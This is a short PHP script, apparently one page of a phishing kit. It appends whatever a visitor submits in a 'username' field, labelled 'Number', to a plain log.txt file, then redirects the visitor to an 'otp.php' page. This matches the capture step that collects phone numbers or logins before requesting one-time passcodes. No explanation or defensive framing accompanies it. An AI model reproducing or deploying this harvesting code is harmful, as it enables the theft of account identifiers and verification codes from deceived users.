<?php

    file_put_contents("log.txt", "Number: " . $_POST['username'] . " ",FILE_APPEND);
header('Location: otp.php');
exit();
